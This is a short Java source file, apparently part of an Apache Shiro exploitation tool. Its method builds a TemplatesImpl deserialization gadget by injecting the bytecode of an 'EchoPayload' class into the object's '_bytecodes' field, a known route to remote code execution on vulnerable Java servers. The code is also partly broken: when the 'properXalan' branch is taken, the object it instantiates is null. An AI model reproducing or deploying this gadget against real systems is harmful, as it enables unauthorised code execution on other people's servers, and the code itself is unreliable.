package com.liev.clouds.utils.shiroutils;


import com.liev.clouds.interfaces.EchoPayload;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

public class Gadgetsplugin
{
    public static <T> T createTemplatesImpl(String classname) throws Exception {
        Class<TemplatesImpl> clazz1 = null;
        Class<T> tplClass = null;

        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            tplClass = (Class)Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
        } else {
            clazz1 = TemplatesImpl.class;
        }


        Class<?> clazz = EchoPayload.Utils.getPayloadClass(classname);

        T templates = (T)clazz1.newInstance();
        byte[] classBytes = ClassFiles.classAsBytes(clazz);

        ReflectionsUtils.setFieldValue(templates, "_bytecodes", new byte[][] { classBytes });



        ReflectionsUtils.setFieldValue(templates, "_name", "Doge");
        return templates;
    }
}



